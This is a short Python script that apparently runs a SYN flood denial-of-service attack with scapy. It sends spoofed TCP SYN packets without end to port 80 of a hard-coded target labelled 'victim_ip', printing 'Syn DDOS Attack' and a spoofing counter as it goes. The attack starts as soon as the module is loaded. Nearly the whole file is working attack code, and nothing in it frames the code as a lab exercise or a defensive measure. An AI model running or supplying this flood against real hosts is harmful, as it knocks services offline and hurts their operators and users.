from scapy.all import IP, TCP, sr1, ICMP, send, DNS, DNSQR, UDP
from scapy.layers.inet import RandShort
import time

victim_ip = "183.100.236.245"

def syn_flooding(ip):
    count = 0
    sta = "192.168.123.50"
    des = ip
    st_port = RandShort()
    de_port = 80
    time.sleep(3)
    print("\033[1m\033[92m" + "Syn DDOS Attack" + "\033[0m")
    time.sleep(1)
    while True:
        packet=IP(src=sta,dst=des)/TCP(flags="S",sport=st_port,dport=de_port)
        detail = packet.show2(dump=True)
        st_ip = str(detail).split('\n')[11]
        des_ip = str(detail).split('\n')[12]
        print(f"\033[1m\033[92m" + "Source IP Address" + "\033[0m" + f" >> {str(st_ip).split('=')[1][1:]}" + "\033[1m\033[96m" + " Destination IP Address" + "\033[0m" + f" >> {str(des_ip).split('=')[1][1:]}" + "\033[1m\033[91m" + f" ...IP_SPOOPING[{count}]" + "\033[0m")
        send(packet,verbose=0)
        count += 1

class total:
    syn_flooding(victim_ip)

if __name__ == "__main__":
    total